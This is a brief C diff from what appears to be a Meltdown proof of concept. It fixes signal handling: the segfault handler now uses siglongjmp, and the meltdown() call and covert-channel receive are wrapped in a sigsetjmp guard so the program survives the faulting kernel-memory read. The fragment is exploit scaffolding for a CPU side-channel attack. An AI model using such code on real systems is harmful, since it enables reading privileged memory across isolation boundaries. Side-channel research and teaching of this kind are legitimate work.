@@ -59,11 +59,11 @@ static void flush_buf(){
 
 static void segfault_handler(int signum) {
     printf("hi\n");
-    sigset_t sigs;
-    sigemptyset(&sigs);
-    sigaddset(&sigs, signum);
-    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
-    sigsetjmp(sig_buf, 1);
+    // sigset_t sigs;
+    // sigemptyset(&sigs);
+    // sigaddset(&sigs, signum);
+    // sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+    siglongjmp(sig_buf, 1); 
 }
 
 
@@ -137,10 +137,11 @@ static int do_meltdown(uintptr_t adrs) {
         printf("Failed to setup signal handler\n");
         return -1;
     }
-    
+    if (sigsetjmp(sig_buf, 1) == 0) {
     // call meltdown
-    meltdown(adrs);
-    int ret = cc_receive();
+        meltdown(adrs);
+        int ret = cc_receive();
+    }
   
   
   
